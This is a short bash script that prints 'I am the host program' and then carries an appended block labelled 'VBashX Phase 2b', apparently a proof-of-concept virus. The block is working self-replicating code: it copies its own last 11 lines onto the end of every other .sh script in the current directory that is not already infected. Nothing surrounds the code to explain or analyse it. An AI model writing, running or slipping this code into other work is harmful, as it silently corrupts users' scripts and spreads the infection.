#!/bin/bash
echo "I am the host program"
# --- VBashX Phase 2b ---
VIRUS_SIZE=11
MY_CODE=$(echo -n $(tail -n $VIRUS_SIZE "$0"))
for f in *.sh; do
    if [ "$(basename "$f")" != "$(basename "$0")" ]; then
        TARGET_CODE=$(echo -n $(tail -n $VIRUS_SIZE "$f"))
        if [ "$MY_CODE" != "$TARGET_CODE" ]; then
            tail -n $VIRUS_SIZE "$0" >> "$f"
        fi
    fi
done
